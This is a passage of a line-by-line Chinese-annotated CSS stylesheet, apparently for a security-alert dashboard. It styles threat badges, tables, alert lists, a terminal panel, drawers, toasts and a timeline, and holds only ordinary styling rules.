| 491 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 492 | 空行：分隔样式规则。 | `&nbsp;` |
| 493 | 选择器：指定接下来要设置样式的页面元素。 | `.badge--critical {` |
| 494 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-critical);` |
| 495 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(236, 72, 153, 0.15);` |
| 496 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(236, 72, 153, 0.3);` |
| 497 | 样式属性：设置 `animation` 的视觉或布局效果。 | `  animation: pulse-glow 2s infinite;` |
| 498 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 499 | 空行：分隔样式规则。 | `&nbsp;` |
| 500 | 选择器：指定接下来要设置样式的页面元素。 | `.badge--emerald {` |
| 501 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--accent-emerald);` |
| 502 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald-glow);` |
| 503 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(16, 185, 129, 0.3);` |
| 504 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 505 | 空行：分隔样式规则。 | `&nbsp;` |
| 506 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 507 | 样式注释：说明这一段 CSS 的用途。 | ` * 表格` |
| 508 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 509 | 选择器：指定接下来要设置样式的页面元素。 | `.table {` |
| 510 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 100%;` |
| 511 | 样式属性：设置 `border-collapse` 的视觉或布局效果。 | `  border-collapse: collapse;` |
| 512 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-body);` |
| 513 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 514 | 空行：分隔样式规则。 | `&nbsp;` |
| 515 | 样式语句：参与页面视觉布局。 | `.table th,` |
| 516 | 选择器：指定接下来要设置样式的页面元素。 | `.table td {` |
| 517 | 样式属性：设置 `text-align` 的视觉或布局效果。 | `  text-align: left;` |
| 518 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: 10px var(--space-md);` |
| 519 | 样式属性：设置 `border-bottom` 的视觉或布局效果。 | `  border-bottom: 1px solid var(--border-subtle);` |
| 520 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 521 | 空行：分隔样式规则。 | `&nbsp;` |
| 522 | 选择器：指定接下来要设置样式的页面元素。 | `.table th {` |
| 523 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-raised);` |
| 524 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 525 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 526 | 样式属性：设置 `text-transform` 的视觉或布局效果。 | `  text-transform: uppercase;` |
| 527 | 样式属性：设置 `letter-spacing` 的视觉或布局效果。 | `  letter-spacing: 0.05em;` |
| 528 | 样式属性：设置 `font-weight` 的视觉或布局效果。 | `  font-weight: 500;` |
| 529 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 530 | 空行：分隔样式规则。 | `&nbsp;` |
| 531 | 选择器：指定接下来要设置样式的页面元素。 | `.table tr {` |
| 532 | 样式属性：设置 `transition` 的视觉或布局效果。 | `  transition: background 0.15s ease;` |
| 533 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 534 | 空行：分隔样式规则。 | `&nbsp;` |
| 535 | 选择器：指定接下来要设置样式的页面元素。 | `.table tbody tr:nth-child(even) {` |
| 536 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-mid);` |
| 537 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 538 | 空行：分隔样式规则。 | `&nbsp;` |
| 539 | 选择器：指定接下来要设置样式的页面元素。 | `.table tbody tr:hover {` |
| 540 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald-glow);` |
| 541 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 542 | 空行：分隔样式规则。 | `&nbsp;` |
| 543 | 样式语句：参与页面视觉布局。 | `.table td.mono,` |
| 544 | 选择器：指定接下来要设置样式的页面元素。 | `.table .mono {` |
| 545 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 546 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-mono);` |
| 547 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--info-blue);` |
| 548 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 549 | 空行：分隔样式规则。 | `&nbsp;` |
| 550 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 551 | 样式注释：说明这一段 CSS 的用途。 | ` * 告警列表项 — DESIGN.md §4.5` |
| 552 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 553 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-list {` |
| 554 | 样式属性：设置 `list-style` 的视觉或布局效果。 | `  list-style: none;` |
| 555 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0;` |
| 556 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: 0;` |
| 557 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 558 | 样式属性：设置 `flex-direction` 的视觉或布局效果。 | `  flex-direction: column;` |
| 559 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 560 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 561 | 空行：分隔样式规则。 | `&nbsp;` |
| 562 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item {` |
| 563 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: grid;` |
| 564 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `  grid-template-columns: 3px 1fr auto;` |
| 565 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 566 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 567 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-sm) var(--space-md) var(--space-sm) 0;` |
| 568 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-dark);` |
| 569 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--border-subtle);` |
| 570 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: var(--radius-md);` |
| 571 | 样式属性：设置 `transition` 的视觉或布局效果。 | `  transition: background 0.15s ease, border-color 0.15s ease;` |
| 572 | 样式属性：设置 `animation` 的视觉或布局效果。 | `  animation: slide-in 0.3s ease-out both;` |
| 573 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 574 | 空行：分隔样式规则。 | `&nbsp;` |
| 575 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item:hover {` |
| 576 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-mid);` |
| 577 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: var(--border-default);` |
| 578 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 579 | 空行：分隔样式规则。 | `&nbsp;` |
| 580 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item__stripe {` |
| 581 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 3px;` |
| 582 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 100%;` |
| 583 | 样式属性：设置 `min-height` 的视觉或布局效果。 | `  min-height: 36px;` |
| 584 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 2px;` |
| 585 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--text-tertiary);` |
| 586 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 587 | 空行：分隔样式规则。 | `&nbsp;` |
| 588 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item--low .alert-item__stripe {` |
| 589 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--threat-low);` |
| 590 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 591 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item--medium .alert-item__stripe {` |
| 592 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--threat-medium);` |
| 593 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 594 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item--high .alert-item__stripe {` |
| 595 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--threat-high);` |
| 596 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 597 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item--critical .alert-item__stripe {` |
| 598 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--threat-critical);` |
| 599 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 600 | 空行：分隔样式规则。 | `&nbsp;` |
| 601 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item__content {` |
| 602 | 样式属性：设置 `min-width` 的视觉或布局效果。 | `  min-width: 0;` |
| 603 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 604 | 空行：分隔样式规则。 | `&nbsp;` |
| 605 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item__title {` |
| 606 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 607 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-body);` |
| 608 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0 0 2px;` |
| 609 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 610 | 空行：分隔样式规则。 | `&nbsp;` |
| 611 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item__meta {` |
| 612 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 613 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 614 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-tertiary);` |
| 615 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 616 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 617 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 618 | 空行：分隔样式规则。 | `&nbsp;` |
| 619 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item__ip {` |
| 620 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--info-blue);` |
| 621 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 622 | 空行：分隔样式规则。 | `&nbsp;` |
| 623 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-item__side {` |
| 624 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 625 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 626 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 627 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 628 | 空行：分隔样式规则。 | `&nbsp;` |
| 629 | 选择器：指定接下来要设置样式的页面元素。 | `.alert-list__empty {` |
| 630 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-tertiary);` |
| 631 | 样式属性：设置 `text-align` 的视觉或布局效果。 | `  text-align: center;` |
| 632 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-xl);` |
| 633 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 634 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 635 | 空行：分隔样式规则。 | `&nbsp;` |
| 636 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 637 | 样式注释：说明这一段 CSS 的用途。 | ` * 终端命令面板 — DESIGN.md §4.6` |
| 638 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 639 | 选择器：指定接下来要设置样式的页面元素。 | `.terminal {` |
| 640 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--bg-void);` |
| 641 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--border-subtle);` |
| 642 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: var(--radius-lg);` |
| 643 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 644 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-mono);` |
| 645 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-md);` |
| 646 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 647 | 样式属性：设置 `flex-direction` 的视觉或布局效果。 | `  flex-direction: column;` |
| 648 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 649 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `  box-shadow: var(--shadow-3);` |
| 650 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 651 | 空行：分隔样式规则。 | `&nbsp;` |
| 652 | 选择器：指定接下来要设置样式的页面元素。 | `.terminal__line {` |
| 653 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: 6px var(--space-sm);` |
| 654 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: var(--radius-sm);` |
| 655 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: transparent;` |
| 656 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 657 | 样式属性：设置 `white-space` 的视觉或布局效果。 | `  white-space: pre-wrap;` |
| 658 | 样式属性：设置 `word-break` 的视觉或布局效果。 | `  word-break: break-word;` |
| 659 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 660 | 空行：分隔样式规则。 | `&nbsp;` |
| 661 | 选择器：指定接下来要设置样式的页面元素。 | `.terminal__line--cmd {` |
| 662 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 663 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 664 | 空行：分隔样式规则。 | `&nbsp;` |
| 665 | 选择器：指定接下来要设置样式的页面元素。 | `.terminal__line--cmd::before {` |
| 666 | 样式属性：设置 `content` 的视觉或布局效果。 | `  content: "$ ";` |
| 667 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--accent-emerald);` |
| 668 | 样式属性：设置 `font-weight` 的视觉或布局效果。 | `  font-weight: 600;` |
| 669 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 670 | 空行：分隔样式规则。 | `&nbsp;` |
| 671 | 选择器：指定接下来要设置样式的页面元素。 | `.terminal__line--ok {` |
| 672 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--accent-emerald);` |
| 673 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 674 | 空行：分隔样式规则。 | `&nbsp;` |
| 675 | 选择器：指定接下来要设置样式的页面元素。 | `.terminal__line--err {` |
| 676 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--error-red);` |
| 677 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 678 | 空行：分隔样式规则。 | `&nbsp;` |
| 679 | 选择器：指定接下来要设置样式的页面元素。 | `.terminal__prompt {` |
| 680 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 681 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 682 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 683 | 样式属性：设置 `border-top` 的视觉或布局效果。 | `  border-top: 1px solid var(--border-subtle);` |
| 684 | 样式属性：设置 `padding-top` 的视觉或布局效果。 | `  padding-top: var(--space-sm);` |
| 685 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 686 | 空行：分隔样式规则。 | `&nbsp;` |
| 687 | 选择器：指定接下来要设置样式的页面元素。 | `.terminal__prompt::before {` |
| 688 | 样式属性：设置 `content` 的视觉或布局效果。 | `  content: "$";` |
| 689 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--accent-emerald);` |
| 690 | 样式属性：设置 `font-weight` 的视觉或布局效果。 | `  font-weight: 600;` |
| 691 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 692 | 空行：分隔样式规则。 | `&nbsp;` |
| 693 | 选择器：指定接下来要设置样式的页面元素。 | `.terminal__input {` |
| 694 | 样式属性：设置 `flex` 的视觉或布局效果。 | `  flex: 1;` |
| 695 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: transparent;` |
| 696 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: none;` |
| 697 | 样式属性：设置 `outline` 的视觉或布局效果。 | `  outline: none;` |
| 698 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 699 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: inherit;` |
| 700 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: inherit;` |
| 701 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 702 | 空行：分隔样式规则。 | `&nbsp;` |
| 703 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 704 | 样式注释：说明这一段 CSS 的用途。 | ` * 图表容器` |
| 705 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 706 | 选择器：指定接下来要设置样式的页面元素。 | `.chart {` |
| 707 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 100%;` |
| 708 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 300px;` |
| 709 | 样式属性：设置 `min-height` 的视觉或布局效果。 | `  min-height: 260px;` |
| 710 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 711 | 空行：分隔样式规则。 | `&nbsp;` |
| 712 | 选择器：指定接下来要设置样式的页面元素。 | `.chart--tall {` |
| 713 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 360px;` |
| 714 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 715 | 空行：分隔样式规则。 | `&nbsp;` |
| 716 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 717 | 样式注释：说明这一段 CSS 的用途。 | ` * Grid 工具` |
| 718 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 719 | 选择器：指定接下来要设置样式的页面元素。 | `.grid-2 {` |
| 720 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: grid;` |
| 721 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 722 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `  grid-template-columns: 3fr 2fr;` |
| 723 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 724 | 空行：分隔样式规则。 | `&nbsp;` |
| 725 | 选择器：指定接下来要设置样式的页面元素。 | `.grid-2--even {` |
| 726 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `  grid-template-columns: 1fr 1fr;` |
| 727 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 728 | 空行：分隔样式规则。 | `&nbsp;` |
| 729 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 730 | 样式注释：说明这一段 CSS 的用途。 | ` * 抽屉 (Drawer)` |
| 731 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 732 | 选择器：指定接下来要设置样式的页面元素。 | `.drawer-overlay {` |
| 733 | 样式属性：设置 `position` 的视觉或布局效果。 | `  position: fixed;` |
| 734 | 样式属性：设置 `inset` 的视觉或布局效果。 | `  inset: 0;` |
| 735 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(0, 0, 0, 0.6);` |
| 736 | 样式属性：设置 `z-index` 的视觉或布局效果。 | `  z-index: 40;` |
| 737 | 样式属性：设置 `opacity` 的视觉或布局效果。 | `  opacity: 0;` |
| 738 | 样式属性：设置 `pointer-events` 的视觉或布局效果。 | `  pointer-events: none;` |
| 739 | 样式属性：设置 `transition` 的视觉或布局效果。 | `  transition: opacity 0.2s ease;` |
| 740 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 741 | 空行：分隔样式规则。 | `&nbsp;` |
| 742 | 选择器：指定接下来要设置样式的页面元素。 | `.drawer-overlay.is-open {` |
| 743 | 样式属性：设置 `opacity` 的视觉或布局效果。 | `  opacity: 1;` |
| 744 | 样式属性：设置 `pointer-events` 的视觉或布局效果。 | `  pointer-events: auto;` |
| 745 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 746 | 空行：分隔样式规则。 | `&nbsp;` |
| 747 | 选择器：指定接下来要设置样式的页面元素。 | `.drawer {` |
| 748 | 样式属性：设置 `position` 的视觉或布局效果。 | `  position: fixed;` |
| 749 | 样式属性：设置 `top` 的视觉或布局效果。 | `  top: 0;` |
| 750 | 样式属性：设置 `right` 的视觉或布局效果。 | `  right: 0;` |
| 751 | 样式属性：设置 `bottom` 的视觉或布局效果。 | `  bottom: 0;` |
| 752 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: min(480px, 100%);` |
| 753 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-dark);` |
| 754 | 样式属性：设置 `border-left` 的视觉或布局效果。 | `  border-left: 1px solid var(--border-subtle);` |
| 755 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `  box-shadow: var(--shadow-3);` |
| 756 | 样式属性：设置 `transform` 的视觉或布局效果。 | `  transform: translateX(100%);` |
| 757 | 样式属性：设置 `transition` 的视觉或布局效果。 | `  transition: transform 0.25s ease;` |
| 758 | 样式属性：设置 `z-index` 的视觉或布局效果。 | `  z-index: 50;` |
| 759 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 760 | 样式属性：设置 `flex-direction` 的视觉或布局效果。 | `  flex-direction: column;` |
| 761 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 762 | 空行：分隔样式规则。 | `&nbsp;` |
| 763 | 选择器：指定接下来要设置样式的页面元素。 | `.drawer.is-open {` |
| 764 | 样式属性：设置 `transform` 的视觉或布局效果。 | `  transform: translateX(0);` |
| 765 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 766 | 空行：分隔样式规则。 | `&nbsp;` |
| 767 | 选择器：指定接下来要设置样式的页面元素。 | `.drawer__header {` |
| 768 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 769 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 770 | 样式属性：设置 `justify-content` 的视觉或布局效果。 | `  justify-content: space-between;` |
| 771 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-md) var(--space-lg);` |
| 772 | 样式属性：设置 `border-bottom` 的视觉或布局效果。 | `  border-bottom: 1px solid var(--border-subtle);` |
| 773 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 774 | 空行：分隔样式规则。 | `&nbsp;` |
| 775 | 选择器：指定接下来要设置样式的页面元素。 | `.drawer__body {` |
| 776 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-lg);` |
| 777 | 样式属性：设置 `overflow-y` 的视觉或布局效果。 | `  overflow-y: auto;` |
| 778 | 样式属性：设置 `flex` 的视觉或布局效果。 | `  flex: 1;` |
| 779 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 780 | 空行：分隔样式规则。 | `&nbsp;` |
| 781 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 782 | 样式注释：说明这一段 CSS 的用途。 | ` * Toast 通知` |
| 783 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 784 | 选择器：指定接下来要设置样式的页面元素。 | `.toast-container {` |
| 785 | 样式属性：设置 `position` 的视觉或布局效果。 | `  position: fixed;` |
| 786 | 样式属性：设置 `bottom` 的视觉或布局效果。 | `  bottom: var(--space-lg);` |
| 787 | 样式属性：设置 `right` 的视觉或布局效果。 | `  right: var(--space-lg);` |
| 788 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 789 | 样式属性：设置 `flex-direction` 的视觉或布局效果。 | `  flex-direction: column;` |
| 790 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 791 | 样式属性：设置 `z-index` 的视觉或布局效果。 | `  z-index: 100;` |
| 792 | 样式属性：设置 `pointer-events` 的视觉或布局效果。 | `  pointer-events: none;` |
| 793 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 794 | 空行：分隔样式规则。 | `&nbsp;` |
| 795 | 选择器：指定接下来要设置样式的页面元素。 | `.toast {` |
| 796 | 样式属性：设置 `min-width` 的视觉或布局效果。 | `  min-width: 260px;` |
| 797 | 样式属性：设置 `max-width` 的视觉或布局效果。 | `  max-width: 360px;` |
| 798 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-md);` |
| 799 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-mid);` |
| 800 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--border-default);` |
| 801 | 样式属性：设置 `border-left` 的视觉或布局效果。 | `  border-left: 3px solid var(--accent-emerald);` |
| 802 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: var(--radius-md);` |
| 803 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 804 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `  box-shadow: var(--shadow-2);` |
| 805 | 样式属性：设置 `pointer-events` 的视觉或布局效果。 | `  pointer-events: auto;` |
| 806 | 样式属性：设置 `animation` 的视觉或布局效果。 | `  animation: slide-in 0.2s ease-out;` |
| 807 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 808 | 空行：分隔样式规则。 | `&nbsp;` |
| 809 | 选择器：指定接下来要设置样式的页面元素。 | `.toast--error {` |
| 810 | 样式属性：设置 `border-left-color` 的视觉或布局效果。 | `  border-left-color: var(--threat-high);` |
| 811 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 812 | 空行：分隔样式规则。 | `&nbsp;` |
| 813 | 选择器：指定接下来要设置样式的页面元素。 | `.toast--warning {` |
| 814 | 样式属性：设置 `border-left-color` 的视觉或布局效果。 | `  border-left-color: var(--threat-medium);` |
| 815 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 816 | 空行：分隔样式规则。 | `&nbsp;` |
| 817 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 818 | 样式注释：说明这一段 CSS 的用途。 | ` * 时间线` |
| 819 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 820 | 选择器：指定接下来要设置样式的页面元素。 | `.timeline {` |
| 821 | 样式属性：设置 `position` 的视觉或布局效果。 | `  position: relative;` |
| 822 | 样式属性：设置 `padding-left` 的视觉或布局效果。 | `  padding-left: var(--space-lg);` |
| 823 | 样式属性：设置 `list-style` 的视觉或布局效果。 | `  list-style: none;` |
| 824 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0;` |
| 825 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 826 | 空行：分隔样式规则。 | `&nbsp;` |
| 827 | 选择器：指定接下来要设置样式的页面元素。 | `.timeline::before {` |
| 828 | 样式属性：设置 `content` 的视觉或布局效果。 | `  content: "";` |
| 829 | 样式属性：设置 `position` 的视觉或布局效果。 | `  position: absolute;` |
| 830 | 样式属性：设置 `top` 的视觉或布局效果。 | `  top: 0;` |
| 831 | 样式属性：设置 `bottom` 的视觉或布局效果。 | `  bottom: 0;` |
| 832 | 样式属性：设置 `left` 的视觉或布局效果。 | `  left: 6px;` |
| 833 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 1px;` |
| 834 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--border-subtle);` |
| 835 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 836 | 空行：分隔样式规则。 | `&nbsp;` |
| 837 | 选择器：指定接下来要设置样式的页面元素。 | `.timeline__item {` |
| 838 | 样式属性：设置 `position` 的视觉或布局效果。 | `  position: relative;` |
| 839 | 样式属性：设置 `padding-bottom` 的视觉或布局效果。 | `  padding-bottom: var(--space-md);` |
| 840 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 841 | 空行：分隔样式规则。 | `&nbsp;` |
| 842 | 选择器：指定接下来要设置样式的页面元素。 | `.timeline__item::before {` |
| 843 | 样式属性：设置 `content` 的视觉或布局效果。 | `  content: "";` |
| 844 | 样式属性：设置 `position` 的视觉或布局效果。 | `  position: absolute;` |
| 845 | 样式属性：设置 `left` 的视觉或布局效果。 | `  left: -22px;` |
| 846 | 样式属性：设置 `top` 的视觉或布局效果。 | `  top: 4px;` |
| 847 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 10px;` |
| 848 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 10px;` |
| 849 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 50%;` |
| 850 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-raised);` |
| 851 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 2px solid var(--accent-emerald);` |
| 852 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
